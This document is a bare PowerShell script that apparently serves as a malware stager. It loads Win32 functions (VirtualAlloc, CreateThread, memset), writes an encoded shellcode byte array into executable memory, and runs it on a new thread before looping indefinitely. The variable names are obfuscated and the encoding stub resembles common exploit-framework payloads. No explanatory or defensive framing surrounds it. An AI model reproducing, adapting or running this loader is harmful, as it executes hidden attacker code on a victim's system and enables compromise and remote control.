
$o4m = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $o4m -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x42,0x73,0x9f,0x7a,0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x4e,0x31,0x5f,0x15,0x83,0xc7,0x04,0x03,0x5f,0x11,0xe2,0xb7,0x8f,0x77,0xf8,0x37,0x70,0x88,0x9d,0xbe,0x95,0xb9,0x9d,0xa4,0xde,0xea,0x2d,0xaf,0xb3,0x06,0xc5,0xfd,0x27,0x9c,0xab,0x29,0x47,0x15,0x01,0x0f,0x66,0xa6,0x3a,0x73,0xe9,0x24,0x41,0xa7,0xc9,0x15,0x8a,0xba,0x08,0x51,0xf7,0x36,0x58,0x0a,0x73,0xe4,0x4d,0x3f,0xc9,0x34,0xe5,0x73,0xdf,0x3c,0x1a,0xc3,0xde,0x6d,0x8d,0x5f,0xb9,0xad,0x2f,0xb3,0xb1,0xe4,0x37,0xd0,0xfc,0xbf,0xcc,0x22,0x8a,0x3e,0x05,0x7b,0x73,0xec,0x68,0xb3,0x86,0xed,0xad,0x74,0x79,0x98,0xc7,0x86,0x04,0x9a,0x13,0xf4,0xd2,0x2f,0x80,0x5e,0x90,0x97,0x6c,0x5e,0x75,0x41,0xe6,0x6c,0x32,0x06,0xa0,0x70,0xc5,0xcb,0xda,0x8d,0x4e,0xea,0x0c,0x04,0x14,0xc8,0x88,0x4c,0xce,0x71,0x88,0x28,0xa1,0x8e,0xca,0x92,0x1e,0x2a,0x80,0x3f,0x4a,0x47,0xcb,0x57,0xbf,0x65,0xf4,0xa7,0xd7,0xfe,0x87,0x95,0x78,0x54,0x00,0x96,0xf1,0x72,0xd7,0xd9,0x2b,0xc2,0x47,0x24,0xd4,0x32,0x41,0xe3,0x80,0x62,0xf9,0xc2,0xa8,0xe9,0xf9,0xeb,0x7c,0xbd,0xa9,0x43,0x2f,0x7d,0x1a,0x24,0x9f,0x15,0x70,0xab,0xc0,0x05,0x7b,0x61,0x69,0x2d,0x97,0x8a,0x96,0xad,0xfa,0xe5,0xf9,0xd9,0x97,0x9c,0x6b,0x44,0x1f,0x71,0x10,0xe2,0xb1,0xfe,0xf6,0x84,0x28,0x75,0x07,0x30,0x1a,0x5d,0x33,0x40,0xa3,0x4b,0xb0,0x00,0x40,0x1e,0xc2,0xd0,0x10,0xdc,0xcc,0xc1,0xbc,0x69,0x2a,0x8b,0x2c,0x3c,0xe4,0x23,0xd4,0x65,0x7e,0xd2,0x19,0xb0,0xfa,0xd4,0x92,0x37,0xfa,0x9a,0x52,0x3d,0xe8,0x4a,0x93,0x08,0x52,0xdc,0xac,0xa6,0xf9,0xe0,0x38,0x4d,0xa8,0xb7,0xd4,0x4f,0x8d,0xff,0x7a,0xaf,0xf8,0x74,0xb2,0x25,0x43,0xe2,0xbb,0xa9,0x43,0xf2,0xed,0xa3,0x43,0x9a,0x49,0x90,0x17,0xbf,0x95,0x0d,0x04,0x6c,0x00,0xae,0x7d,0xc1,0x83,0xc6,0x83,0x3c,0xe3,0x48,0x7b,0x6b,0xf5,0xb5,0xaa,0x55,0x83,0xd7,0x6e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ib9l=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ib9l.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ib9l,0,0,0);for (;;){Start-sleep 60};

